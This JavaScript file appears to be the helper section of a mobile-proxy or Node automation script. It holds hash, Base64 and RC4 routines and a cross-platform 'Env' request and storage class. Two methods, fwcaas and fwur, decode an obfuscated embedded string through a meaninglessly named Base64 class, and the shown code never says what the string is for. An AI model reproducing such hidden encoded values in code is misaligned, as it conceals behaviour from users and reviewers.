3572445317), u = j(u, v, w, t, x[o + 6], J, 76029189), t = j(t, u, v, w, x[o + 9], G, 3654602809), w = j(w, t, u, v, x[o + 12], H, 3873151461), v = j(v, w, t, u, x[o + 15], I, 530742520), u = j(u, v, w, t, x[o + 2], J, 3299628645), t = k(t, u, v, w, x[o + 0], K, 4096336452), w = k(w, t, u, v, x[o + 7], L, 1126891415), v = k(v, w, t, u, x[o + 14], M, 2878612391), u = k(u, v, w, t, x[o + 5], N, 4237533241), t = k(t, u, v, w, x[o + 12], K, 1700485571), w = k(w, t, u, v, x[o + 3], L, 2399980690), v = k(v, w, t, u, x[o + 10], M, 4293915773), u = k(u, v, w, t, x[o + 1], N, 2240044497), t = k(t, u, v, w, x[o + 8], K, 1873313359), w = k(w, t, u, v, x[o + 15], L, 4264355552), v = k(v, w, t, u, x[o + 6], M, 2734768916), u = k(u, v, w, t, x[o + 13], N, 1309151649), t = k(t, u, v, w, x[o + 4], K, 4149444226), w = k(w, t, u, v, x[o + 11], L, 3174756917), v = k(v, w, t, u, x[o + 2], M, 718787259), u = k(u, v, w, t, x[o + 9], N, 3951481745), t = c(t, p), u = c(u, q), v = c(v, r), w = c(w, s); var O = m(t) + m(u) + m(v) + m(w); return O.toLowerCase() }


function encodeUTF8(s) {
    var i, r = [], c, x;
    for (i = 0; i < s.length; i++)
        if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
        else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
        else {
            if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                    r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
            else r.push(0xE0 + (c >> 12 & 0xF));
            r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
        };
    return r;
}

function sha(s) {
    var data = new Uint8Array(encodeUTF8(s))
    var i, j, t;
    var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
    s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
    for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
    s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
    s[l - 1] = data.length << 3;
    var w = [], f = [
        function () { return m[1] & m[2] | ~m[1] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; },
        function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; }
    ], rol = function (n, c) { return n << c | n >>> (32 - c); },
        k = [1518500249, 1859775393, -1894007588, -899497514],
        m = [1732584193, -271733879, null, null, -1009589776];
    m[2] = ~m[0], m[3] = ~m[1];
    for (i = 0; i < s.length; i += 16) {
        var o = m.slice(0);
        for (j = 0; j < 80; j++)
            w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
        for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
    };
    t = new DataView(new Uint32Array(m).buffer);
    for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

    var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
        return (e < 16 ? "0" : "") + e.toString(16);
    }).join("");
    return hex;
}



function FxPCnMKLw7() {

    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

    // public method for encoding  
    this.encode = function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = _utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
                _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
                _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
        }
        return output;
    }

    // public method for decoding  
    this.decode = function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = _keyStr.indexOf(input.charAt(i++));
            enc2 = _keyStr.indexOf(input.charAt(i++));
            enc3 = _keyStr.indexOf(input.charAt(i++));
            enc4 = _keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }

    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }
        return utftext;
    }

    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}

function rc4(data, key) {
    var seq = Array(256); //int
    var das = Array(data.length); //code of data
    for (var i = 0; i < 256; i++) {
        seq[i] = i;
        var j = (j + seq[i] + key.charCodeAt(i % key.length)) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
    }
    for (var i = 0; i < data.length; i++) {
        das[i] = data.charCodeAt(i)
    }
    for (var x = 0; x < das.length; x++) {
        var i = (i + 1) % 256;
        var j = (j + seq[i]) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
        var k = (seq[i] + (seq[j] % 256)) % 256;
        das[x] = String.fromCharCode(das[x] ^ seq[k]);
    }
    return das.join('');
}
function Env(t, e) {
    class s {
        constructor(t) {
            this.env = t
        }
        send(t, e = "GET") {
            t = "string" == typeof t ? {
                url: t
            } : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }
        get(t) {
            return this.send.call(this.env, t)
        }
        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }
    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`)
        }
        isNode() {
            return "undefined" != typeof module && !!module.exports
        }
        isQuanX() {
            return "undefined" != typeof $task
        }
        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }
        isLoon() {
            return "undefined" != typeof $loon
        }
        isShadowrocket() {
            return "undefined" != typeof $rocket
        }
        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }
        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }
        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch { }
            return s
        }
        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }
        getScript(t) {
            return new Promise(e => {
                this.get({
                    url: t
                }, (t, s, i) => e(i))
            })
        }
        runScript(t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {
                        script_text: t,
                        mock_type: "cron",
                        timeout: r
                    },
                    headers: {
                        "X-Key": o,
                        Accept: "*/*"
                    }
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }
        loaddata() {
            if (!this.isNode()) return {}; {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e);
                if (!s && !i) return {}; {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }
        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e),
                    r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }
        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i)
                if (r = Object(r)[t], void 0 === r) return s;
            return r
        }
        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }
        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }
        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }
        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }
        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }
        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }
        get(t, e = (() => { })) {
            if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let s = require("iconv-lite");
                this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                    try {
                        if (t.headers["set-cookie"]) {
                            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                            s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                        }
                    } catch (t) {
                        this.logErr(t)
                    }
                }).then(t => {
                    const {
                        statusCode: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, s.decode(h, this.encoding))
                }, t => {
                    const {
                        message: i,
                        response: r
                    } = t;
                    e(i, r, r && s.decode(r.rawBody, this.encoding))
                })
            }
        }
        post(t, e = (() => { })) {
            const s = t.method ? t.method.toLocaleLowerCase() : "post";
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient[s](t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let i = require("iconv-lite");
                this.initGotEnv(t);
                const {
                    url: r,
                    ...o
                } = t;
                this.got[s](r, o).then(t => {
                    const {
                        statusCode: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, i.decode(h, this.encoding))
                }, t => {
                    const {
                        message: s,
                        response: r
                    } = t;
                    e(s, r, r && i.decode(r.rawBody, this.encoding))
                })
            }
        }
        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }
        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
                    "open-url": t
                } : this.isSurge() ? {
                    url: t
                } : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============📣系统通知📣=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }
        fwcaas() {
            return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
        }
        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }
        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
        }
        fwur() {
            var bbas = new FxPCnMKLw7()
            return bbas.decode(this.fwcaas());
        }
        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }
        done(t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
